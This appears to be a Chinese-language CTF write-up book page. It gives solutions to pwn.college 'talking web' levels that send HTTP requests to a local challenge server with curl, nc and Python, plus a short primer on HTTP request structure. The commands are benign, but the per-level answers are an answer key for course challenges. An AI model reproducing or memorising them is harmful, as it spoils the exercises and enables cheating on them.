<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js rust">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CTF-CLASS</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta name="description" content="TephrocactusMYC&#x27;s CTF WriteUps.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

        <!-- MathJax -->
        <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "rust";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('rust')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">ABOUT CTF CLASS</a></li><li class="spacer"></li><li class="chapter-item expanded "><a href="CSE365/index.html"><strong aria-hidden="true">1.</strong> CSE365</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CSE365/talking-web.html"><strong aria-hidden="true">1.1.</strong> talking web</a></li><li class="chapter-item expanded "><a href="CSE365/Intercepting-Communication.html"><strong aria-hidden="true">1.2.</strong> intercepting communication</a></li><li class="chapter-item expanded "><a href="CSE365/websecurity.html"><strong aria-hidden="true">1.3.</strong> websecurity</a></li><li class="chapter-item expanded "><a href="CSE365/cryptography.html"><strong aria-hidden="true">1.4.</strong> cryptography</a></li></ol></li><li class="chapter-item expanded "><a href="CSE466/index.html"><strong aria-hidden="true">2.</strong> CSE466</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CSE466/program-misuse.html"><strong aria-hidden="true">2.1.</strong> program-misuse</a></li><li class="chapter-item expanded "><a href="CSE466/program-interaction.html"><strong aria-hidden="true">2.2.</strong> program-interaction</a></li></ol></li><li class="chapter-item expanded "><a href="MalwareAnalysis/READMD.html"><strong aria-hidden="true">3.</strong> more-information</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MalwareAnalysis/knowledge/index.html"><strong aria-hidden="true">3.1.</strong> knowledge</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MalwareAnalysis/knowledge/ch0.html"><strong aria-hidden="true">3.1.1.</strong> ch0</a></li><li class="chapter-item expanded "><a href="MalwareAnalysis/knowledge/ch1.html"><strong aria-hidden="true">3.1.2.</strong> ch1</a></li></ol></li><li class="chapter-item expanded "><a href="MalwareAnalysis/Lab/index.html"><strong aria-hidden="true">3.2.</strong> Lab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MalwareAnalysis/Lab/lab1.html"><strong aria-hidden="true">3.2.1.</strong> lab1</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="WarGame/index.html"><strong aria-hidden="true">4.</strong> WarGame</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="WarGame/bandit.html"><strong aria-hidden="true">4.1.</strong> bandit</a></li><li class="chapter-item expanded "><a href="WarGame/krypton.html"><strong aria-hidden="true">4.2.</strong> krypton</a></li><li class="chapter-item expanded "><a href="WarGame/leviathan.html"><strong aria-hidden="true">4.3.</strong> leviathan</a></li><li class="chapter-item expanded "><a href="WarGame/Natas.html"><strong aria-hidden="true">4.4.</strong> natas</a></li></ol></li><li class="chapter-item expanded "><a href="Useful-tools/index.html"><strong aria-hidden="true">5.</strong> useful tools</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="Useful-tools/tmux.html"><strong aria-hidden="true">5.1.</strong> tmux</a></li><li class="chapter-item expanded "><a href="Useful-tools/vim.html"><strong aria-hidden="true">5.2.</strong> vim</a></li><li class="chapter-item expanded "><a href="Useful-tools/yara.html"><strong aria-hidden="true">5.3.</strong> yara</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">CTF-CLASS</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/TephrocactusMYC/CTF-CLASS" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ctf-class"><a class="header" href="#ctf-class">CTF-CLASS</a></h1>
<p>一个存了很多WP的地方，我会不断更新这些内容！</p>
<p>==我不得不提醒，大多数 CTF 题目的 WP 都是随机而且独立的，也就是说如果你仅仅是复制了我的 WP 然后提交，往往会导致你不能够通过，甚至被平台检测判定为作弊！==</p>
<h1 id="cse365-sp23"><a class="header" href="#cse365-sp23">CSE365 sp23</a></h1>
<p>官网在<a href="https://pwn.college/cse365-s2023/">这儿</a>,我的目录在<a href="./CSE365/">这儿</a>,看起来很入门的课，暂时做了一部分，找一段时间把pwn college的东西都做完然后放上来。</p>
<ul>
<li>Talking Web</li>
<li>Assembly Crash Course</li>
<li>Building a Web Server</li>
<li>Reverse Engineering</li>
<li>Intercepting Communication</li>
<li>Cryptography</li>
<li>Web Security</li>
<li>Binary Exploitation</li>
</ul>
<h1 id="wargame"><a class="header" href="#wargame">Wargame</a></h1>
<p>发现的一个小的<a href="https://overthewire.org/wargames/">安全网站</a>，有几个系列也挺入门，暂时做了bandit</p>
<ul>
<li>bandit</li>
<li>Natas</li>
<li>Leviathan</li>
<li>Krypton</li>
<li>Narnia</li>
<li>Behemoth</li>
<li>Utumno</li>
<li>Maze</li>
<li>Vortex</li>
<li>Manpage</li>
<li>Drifter</li>
<li>FormulaOne</li>
</ul>
<h1 id="cse466-fall22"><a class="header" href="#cse466-fall22">CSE466 FALL22</a></h1>
<ul>
<li>Program Misuse</li>
<li>Program Interaction</li>
<li>Assembly Crash Course</li>
<li>Shellcode Injection</li>
<li>Sandboxing</li>
<li>Debugging Refresher</li>
<li>Reverse Engineering</li>
<li>Memory Errors</li>
<li>Race Conditions</li>
<li>Kernel Security</li>
<li>Program Exploitation</li>
<li>System Exploitation</li>
</ul>
<h1 id="malwareanalysis"><a class="header" href="#malwareanalysis">MalwareAnalysis</a></h1>
<p>《恶意代码分析实战》一书阅读。</p>
<ul>
<li>CH/Lab1</li>
<li>CH2</li>
<li>CH/Lab3</li>
<li>CH/Lab4</li>
<li>CH/Lab5</li>
<li>CH/Lab6</li>
<li>CH/Lab7</li>
<li>CH/Lab8</li>
<li>CH/Lab9</li>
<li>CH/Lab10</li>
<li>CH/Lab11</li>
<li>CH/Lab12</li>
<li>CH/Lab13</li>
<li>CH/Lab14</li>
<li>CH/Lab15</li>
<li>CH/Lab16</li>
<li>CH/Lab17</li>
<li>CH/Lab18</li>
<li>CH/Lab19</li>
<li>CH/Lab20</li>
<li>CH/Lab21</li>
</ul>
<h1 id="todo-list"><a class="header" href="#todo-list">TODO-LIST</a></h1>
<ul>
<li>CSE 494 sp23
<ul>
<li>Return Oriented Programming</li>
<li>Format String Exploits</li>
<li>File Struct exploits</li>
<li>Dynamic Allocator Misuse</li>
<li>Exploitation Primitives and Memory Mastery</li>
<li>Dynamic Allocator Exploitation</li>
<li>Microarchitecture Exploitation</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cse365"><a class="header" href="#cse365">CSE365</a></h1>
<p>sp23，不得不说pwn college真是精品网站，题目很丰富，质量也还不错，入门、进阶都有，而且提供的靶场非常良心！在我一大通瞎搞之后，空间居然还这么大！</p>
<pre><code>Filesystem      Size  Used Avail Use% Mounted on
overlay         916G  169G  701G  20% /
tmpfs            64M     0   64M   0% /dev
tmpfs           126G     0  126G   0% /sys/fs/cgroup
overlay         916G  169G  701G  20% /usr/sbin/docker-init
/dev/loop79     982M  557M  360M  61% /home/hacker
/dev/sdc2       916G  169G  701G  20% /etc/hosts
shm              64M     0   64M   0% /dev/shm
tmpfs           126G     0  126G   0% /proc/acpi
tmpfs           126G     0  126G   0% /proc/scsi
tmpfs           126G     0  126G   0% /sys/firmware
</code></pre>
<p>而且主目录持久保存，真是爱了！</p>
<h1 id="模块总结"><a class="header" href="#模块总结">模块总结</a></h1>
<h2 id="talking-web"><a class="header" href="#talking-web">talking web</a></h2>
<p>这个模块比较简单，就是让你熟练使用curl、nc、python来进行http包的发送，是比较基础的。但是可以都记录下来这些内容，以便日后查阅。</p>
<h2 id="intercepting-communication"><a class="header" href="#intercepting-communication">intercepting communication</a></h2>
<p>这个模块涉及到了计算机网络的四层网络结构，还算是有点意思吧，大多数所需要的知识其实如果学过计算机网络这门课本身的话，都是最最浅显的。不过这个模块的意义就在于学习一下arp,ip,scapy怎么用，看看这些知识是怎么应用的，最后一个题有些困难，我在看了解答之后也是问了一个学了CTF的同学才搞定，G</p>
<p>主要是scapy的学习资料有点儿少，我搜了不少也没搜到最后一个特别相关的，不过相信在写完这些挑战之后对scapy和计算机网络的理解会有一定加深的。</p>
<h1 id="讲解"><a class="header" href="#讲解">讲解</a></h1>
<p>YOUTUBE上pwn college上传了老师的讲解，大多数很细致，少部分没有完成给出过程，但都有思路，需要自己去实现。其实在实现了之后发现也就是这么回事儿，但是思考的过程有时候是痛苦的。</p>
<h1 id="友链"><a class="header" href="#友链">友链</a></h1>
<p>另一位搞安全的盆友的<a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/">博客</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="knoeledge"><a class="header" href="#knoeledge">knoeledge</a></h1>
<p>重点是http 请求报文，这部分不太涉及响应报文
一个 http 请求报文由四个部分组成：</p>
<ol>
<li>请求行（Request-Line）</li>
<li>请求头部（Request Header Fields）</li>
<li>回车换行（CRLF）</li>
<li>消息体（Message Body）</li>
</ol>
<h3 id="请求行request-line"><a class="header" href="#请求行request-line">请求行（Request-Line）</a></h3>
<p>我们来看一开始给的示例的请求行</p>
<pre><code>POST / HTTP/1.1
</code></pre>
<p>请求行分为了三个部分：</p>
<ol>
<li>请求方法（Method）</li>
<li>请求 URI</li>
<li>HTTP 协议版本
三者之间用空格分隔。</li>
</ol>
<h4 id="请求方法"><a class="header" href="#请求方法">请求方法</a></h4>
<ul>
<li>GET：获取资源</li>
<li>POST：传输实体主体</li>
<li>PUT：传输文件</li>
<li>HEAD：获得报文首部（相当于GET方法获得的资源去掉正文）</li>
<li>DELETE：删除文件</li>
<li>OPTIONS：询问支持的方法（客户端问服务器）</li>
<li>TRACE：追踪路径</li>
<li>OCONNECT：要求用隧道协议连接代理</li>
<li>LINK：建立与资源之间的联系</li>
<li>UNLINE：断开连接关系</li>
</ul>
<h3 id="请求头部request-header-fields"><a class="header" href="#请求头部request-header-fields">请求头部（Request Header Fields）</a></h3>
<p>这部分由成对的请求头部组成，用来告知服务端请求的更多信息。</p>
<p><strong>这是未来的重中之重！务必掌握！</strong></p>
<ul>
<li>Host ：请求的资源在哪个主机的端口上</li>
<li>Connection：该请求支持长连接（heep_alive）</li>
<li>Content-Length：正文内容长度</li>
<li>Content-Type：数据类型</li>
<li>User-Agent：声明用户的操作系统和浏览器版本信息</li>
<li>Accent：发起了请求</li>
<li>Referer：当前页面是从哪个页面跳转过来的</li>
<li>Accept-Encoding：接受的编码</li>
<li>Accept-Language：接受的语言类型</li>
<li>Cookie：用于在客户端存储少量信息，通常用于实现会话（session）功能</li>
</ul>
<h3 id="消息体message-body"><a class="header" href="#消息体message-body">消息体（Message Body）</a></h3>
<p>这部分携带了本次请求需要发往服务端的信息，有的 Method 有这部分，而有的 Method 不需要这部分。</p>
<p>比如 get 方法就没有消息体，get 方法一般都是通过 query 来传递参数。</p>
<p>而 post 方法一般就有消息体。</p>
<h2 id="请求头部具体信息"><a class="header" href="#请求头部具体信息">请求头部具体信息</a></h2>
<h2 id="ref"><a class="header" href="#ref">ref</a></h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/112060856">https://zhuanlan.zhihu.com/p/112060856</a></li>
<li><a href="https://blog.csdn.net/qq_40933663/article/details/90045869">https://blog.csdn.net/qq_40933663/article/details/90045869</a></li>
</ul>
<h1 id="useful-cmd"><a class="header" href="#useful-cmd">Useful cmd</a></h1>
<pre><code>/challenge/run
</code></pre>
<p>Output:</p>
<pre><code>hacker@talking-web-level-12:~$ /challenge/run
 * Serving Flask app 'run'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:80
Press CTRL+C to quit
</code></pre>
<p>行吧，这一大堆挑战，倒是让我把curl nc这俩玩意儿玩儿熟了。。。</p>
<h1 id="level1"><a class="header" href="#level1">level1</a></h1>
<p>Send an HTTP request using curl</p>
<pre><code>curl http://127.0.0.1:80
</code></pre>
<h1 id="level2"><a class="header" href="#level2">level2</a></h1>
<p>Send an HTTP request using nc</p>
<pre><code>printf &quot;GET / HTTP/1.1\r\n\r\n&quot; | nc 127.0.0.1 80
</code></pre>
<h2 id="ref-1"><a class="header" href="#ref-1">ref</a></h2>
<p><a href="https://osric.com/chris/accidental-developer/2018/01/using-nc-netcat-to-make-an-http-request/">a blog</a></p>
<h1 id="level3"><a class="header" href="#level3">level3</a></h1>
<p>Send an HTTP request using python</p>
<pre><code>import requests

response = requests.get('http://127.0.0.1:80')
print(response.content)
</code></pre>
<h1 id="level4"><a class="header" href="#level4">level4</a></h1>
<p>Set the host header in an HTTP request using curl</p>
<pre><code>curl -H 'Host: f04e757423e4172f7391a2c52dd6d52b' http://127.0.0.1:80
</code></pre>
<h1 id="level5"><a class="header" href="#level5">level5</a></h1>
<p>Set the host header in an HTTP request using nc</p>
<pre><code>echo -e &quot;GET / HTTP/1.1\r\nHost: e87665191d938ed557e6d75bed2a59e7\r\n\r\n&quot; | nc 127.0.0.1 80
</code></pre>
<h1 id="level6"><a class="header" href="#level6">level6</a></h1>
<p>Set the host header in an HTTP request using python</p>
<pre><code>import requests

url = 'http://127.0.0.1:80'
headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'}
response = requests.get(url, headers=headers)

print(response.text)

</code></pre>
<h1 id="level7"><a class="header" href="#level7">level7</a></h1>
<p>Set the path in an HTTP request using curl</p>
<pre><code>curl http://127.0.0.1:80/32edfeba32e2616897b6a4907182e609
</code></pre>
<h1 id="level8"><a class="header" href="#level8">level8</a></h1>
<p>Set the path in an HTTP request using nc</p>
<pre><code>printf &quot;GET /a2ef4bee2f651380996e3e91ec9ae47b HTTP/1.1\r\n\r\n&quot; | nc 127.0.0.1 80
</code></pre>
<h1 id="level9"><a class="header" href="#level9">level9</a></h1>
<p>Set the path in an HTTP request using python</p>
<pre><code>import requests

url = 'http://127.0.0.1:80/563d4434a61e9b4f8aad9f89476f9d56'
headers = {'Host': '37ae8c34ce6b69de03c0514664f1de72'}
response = requests.get(url, headers=headers)

print(response.text)

</code></pre>
<h1 id="level10"><a class="header" href="#level10">level10</a></h1>
<p>URL encode a path in an HTTP request using curl</p>
<pre><code>curl --request GET --url 'http://127.0.0.1/5db90f90%20c57f0931/898c7a05%207a6a6c70'
</code></pre>
<h1 id="level11"><a class="header" href="#level11">level11</a></h1>
<p>URL encode a path in an HTTP request using nc</p>
<pre><code>echo -ne &quot;GET /c84632a0%203d7cd667/cc68c4e5%205289cce4 HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n&quot; | nc 127.0.0.1 80
</code></pre>
<h1 id="level12"><a class="header" href="#level12">level12</a></h1>
<p>URL encode a path in an HTTP request using python</p>
<pre><code>import http.client

conn = http.client.HTTPConnection(&quot;127.0.0.1&quot;, 80)
path = '/24f18995%2035ce2423/0dc75e53%20a62355c0'
conn.request(&quot;GET&quot;, path)
response = conn.getresponse()

print(response.read().decode())

</code></pre>
<h1 id="level13"><a class="header" href="#level13">level13</a></h1>
<p>Specify an argument in an HTTP request using curl</p>
<pre><code>curl -X GET &quot;http://127.0.0.1?a=d12e875e302a313b93e311080177c69e&quot;

</code></pre>
<h1 id="level14"><a class="header" href="#level14">level14</a></h1>
<p>Specify an argument in an HTTP request using nc</p>
<pre><code>echo -ne &quot;GET /?a=2469a7322bdff77e7cf50f7a397ecf1e HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n&quot; | nc 127.0.0.1 80

</code></pre>
<h1 id="level15"><a class="header" href="#level15">level15</a></h1>
<p>Specify an argument in an HTTP request using python</p>
<pre><code>import http.client

conn = http.client.HTTPConnection(&quot;127.0.0.1&quot;, 80)
params = 'a=70206814776ee99485d36f75416cc53e'
conn.request(&quot;GET&quot;, &quot;/?&quot; + params)
response = conn.getresponse()

print(response.read().decode())
</code></pre>
<p>or</p>
<pre><code>import requests

url = 'http://127.0.0.1/?a=2469a7322bdff77e7cf50f7a397ecf1e'
response = requests.get(url)

print(response.text)

</code></pre>
<h1 id="level16"><a class="header" href="#level16">level16</a></h1>
<p>Specify multiple arguments in an HTTP request using curl</p>
<pre><code>curl -X GET &quot;http://127.0.0.1?a=ecd147484bddde7d37b1911de43a8879&amp;b=40d9af5c%20d0b5b669%266fea1792%23e808fb58&quot;
</code></pre>
<h1 id="level17"><a class="header" href="#level17">level17</a></h1>
<p>Specify multiple arguments in an HTTP request using nc</p>
<pre><code>echo -ne &quot;GET /?a=5d723fd68383a9c49eb60b0633069601&amp;b=164073f7%207871c6b5%26b94dd88d%23977ae717 HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n&quot; | nc 127.0.0.1 80
</code></pre>
<h1 id="level18"><a class="header" href="#level18">level18</a></h1>
<p>Specify multiple arguments in an HTTP request using python</p>
<pre><code>import requests

url = 'http://127.0.0.1/?a=4ce9272291b7199073124105d91e05b8&amp;b=56eb0b42%204ae6359b%26f16e873e%2313ac55ab'
response = requests.get(url)

print(response.text)

</code></pre>
<h1 id="level19"><a class="header" href="#level19">level19</a></h1>
<p>Include form data in an HTTP request using curl</p>
<pre><code>curl -X POST -d &quot;a=aa62a14fe954e109fd0afd6a6b81ae87&amp;b=123&quot; &quot;http://127.0.0.1/&quot;

</code></pre>
<h1 id="level20"><a class="header" href="#level20">level20</a></h1>
<p>Include form data in an HTTP request using nc</p>
<pre><code>echo -ne &quot;POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 64\r\n\r\na=0f4e8daf3fc9d8aa6a59af8b111cd9b6&quot; | nc 127.0.0.1 80

</code></pre>
<h1 id="level21"><a class="header" href="#level21">level21</a></h1>
<p>Include form data in an HTTP request using python</p>
<pre><code>import requests

url = 'http://127.0.0.1/'
data = {'a': '728301dd59f5157a45b164530cd4bd9a'}
response = requests.post(url, data=data)

print(response.text)

</code></pre>
<h1 id="level22"><a class="header" href="#level22">level22</a></h1>
<p>Include form data with multiple fields in an HTTP request using curl</p>
<pre><code>curl -X POST -d &quot;a=6d2e619d8691e29c605eacecff1d17f5&amp;b=40f3c192%204a42b9c8%26042940eb%23ce8b5cc9&quot; &quot;http://127.0.0.1/&quot;
</code></pre>
<h1 id="level23"><a class="header" href="#level23">level23</a></h1>
<p>Include form data with multiple fields in an HTTP request using nc</p>
<pre><code>echo -ne &quot;POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 78\r\n\r\na=7bd29b83c57c2e3a0c9f0387fabea724&amp;b=20c245cf%2075d26cf5%26100f8c42%23d1702767&quot; | nc 127.0.0.1 80
</code></pre>
<h1 id="level24"><a class="header" href="#level24">level24</a></h1>
<p>Include form data with multiple fields in an HTTP request using python</p>
<pre><code>import requests

url = 'http://127.0.0.1/'
data = {'a': 'db865b3bfd0d2e5ffa0c112dc700ddb9','b':'d7d3ad1a edee631b&amp;eba293d5#d6e4cf79'}
response = requests.post(url, data=data)

print(response.text)

</code></pre>
<h1 id="level25"><a class="header" href="#level25">level25</a></h1>
<p>Include json data in an HTTP request using curl</p>
<pre><code>curl -X POST -H &quot;Content-Type: application/json&quot; -d '{&quot;a&quot;: &quot;e1d94af35f929e364d037ca78f5dbfa0&quot;}' http://127.0.0.1/

</code></pre>
<h1 id="level26"><a class="header" href="#level26">level26</a></h1>
<p>Include json data in an HTTP request using nc</p>
<pre><code>data='{&quot;a&quot;: &quot;95a77ed287428e0fbc550158d061c07c&quot;}'
length=$(echo -n &quot;$data&quot; | wc -c)
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: %s\r\n\r\n%s' &quot;$length&quot; &quot;$data&quot; | nc 127.0.0.1 80

</code></pre>
<h1 id="level27"><a class="header" href="#level27">level27</a></h1>
<p>Include json data in an HTTP request using python</p>
<pre><code>import requests
import json

url = &quot;http://127.0.0.1&quot;
data = {'a': &quot;98f37a6b119aec9d10b6a7de1934c9ca&quot;}
json_data = json.dumps(data)

headers = {'Content-Type': 'application/json'}

response = requests.post(url, data=json_data, headers=headers)

print(response.text)

</code></pre>
<h1 id="level28"><a class="header" href="#level28">level28</a></h1>
<p>Include complex json data in an HTTP request using curl</p>
<pre><code>curl -X POST -H &quot;Content-Type: application/json&quot; -d '{&quot;a&quot;: &quot;39a0e409bba714d0ffe73ce038cb7b3a&quot;, &quot;b&quot;: {&quot;c&quot;: &quot;930862ea&quot;, &quot;d&quot;: [&quot;c6a605f0&quot;, &quot;c7ad7398 3fbbb9dc&amp;458f3441#25f76ea0&quot;]}}' http://127.0.0.1/

</code></pre>
<h1 id="level29"><a class="header" href="#level29">level29</a></h1>
<p>Include complex json data in an HTTP request using nc</p>
<pre><code>data='{&quot;a&quot;: &quot;b7ae4afbfd6f78ad7ab06f1203ece1be&quot;,&quot;b&quot;:{&quot;c&quot;: &quot;0ce40827&quot;, &quot;d&quot;: [&quot;fb1739d2&quot;, &quot;5cde3361 bfdb9003&amp;a42c27d5#f291d8c2&quot;]}}'
length=$(echo -n &quot;$data&quot; | wc -c)
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: %s\r\n\r\n%s' &quot;$length&quot; &quot;$data&quot; | nc -q 0 127.0.0.1 80
</code></pre>
<h1 id="level30"><a class="header" href="#level30">level30</a></h1>
<p>Include complex json data in an HTTP request using python</p>
<pre><code>import requests
import json

url = &quot;http://127.0.0.1&quot;
data = {'a': &quot;04c2b7fc38f2a2057ab89b310a7d8311&quot;,
    &quot;b&quot;:{
        'c': '5ff12d56',
        'd': ['93ca0c53', '9b346607 fa6d6f12&amp;c772efa3#fddc4350']
        }
    }
json_data = json.dumps(data)

headers = {'Content-Type': 'application/json'}

response = requests.post(url, data=json_data, headers=headers)

print(response.text)
</code></pre>
<h1 id="level31"><a class="header" href="#level31">level31</a></h1>
<p>Follow an HTTP redirect from HTTP response using curl</p>
<pre><code>curl -L http://127.0.0.1
</code></pre>
<h1 id="level32"><a class="header" href="#level32">level32</a></h1>
<p>Follow an HTTP redirect from HTTP response using nc</p>
<pre><code>printf 'GET /fd33eca3350f203a7cc09fa116eaa060 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' | nc -w 10 -q 0 127.0.0.1 80
</code></pre>
<h1 id="level33"><a class="header" href="#level33">level33</a></h1>
<p>Follow an HTTP redirect from HTTP response using python</p>
<pre><code>import requests

url = 'http://127.0.0.1'
response = requests.get(url, allow_redirects=True)
new_response = requests.get(response.url)
print(new_response.text)
</code></pre>
<h1 id="level34"><a class="header" href="#level34">level34</a></h1>
<p>Include a cookie from HTTP response using curl</p>
<pre><code>curl -b &quot;cookie=d2b2eb6ac86abb563027659450780a51&quot; -L -v http://127.0.0.1

</code></pre>
<h1 id="level35"><a class="header" href="#level35">level35</a></h1>
<p>Include a cookie from HTTP response using nc</p>
<pre><code>printf 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: cookie=c1c5e422a53c2b73d080674d417d06fd\r\nConnection: close\r\n\r\n' | nc 127.0.0.1 80

</code></pre>
<h1 id="level36"><a class="header" href="#level36">level36</a></h1>
<p>Include a cookie from HTTP response using python
貌似题有点儿毛病啊。。。</p>
<pre><code>import requests

url = 'http://127.0.0.1'
cookies = {'cookie_name': 'cookie_value'}
response = requests.get(url, cookies=cookies)

print(response.text)
</code></pre>
<h1 id="level37"><a class="header" href="#level37">level37</a></h1>
<p>Include a cookie from HTTP response using curl</p>
<pre><code>curl -c cookies.txt http://127.0.0.1
curl -b cookies.txt -L -v http://127.0.0.1
</code></pre>
<h1 id="level38"><a class="header" href="#level38">level38</a></h1>
<p>Include a cookie from HTTP response using nc</p>
<p>好吧这个玩意儿，就是重复运行几遍，就行了，应该写个脚本。。。
我TM手动输了好几遍，我日。。。</p>
<pre><code>printf 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6MX0.ZLMdXw.VU5O3fTNhAgzX_0GG5B3kRNVZ0M\r\nConnection: close\r\n\r\n' | nc 127.0.0.1 80
printf 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZLMdcQ.Ip32pWs2LPaq23ckcO5TQSjN5Us\r\nConnection: close\r\n\r\n' | nc 127.0.0.1 80
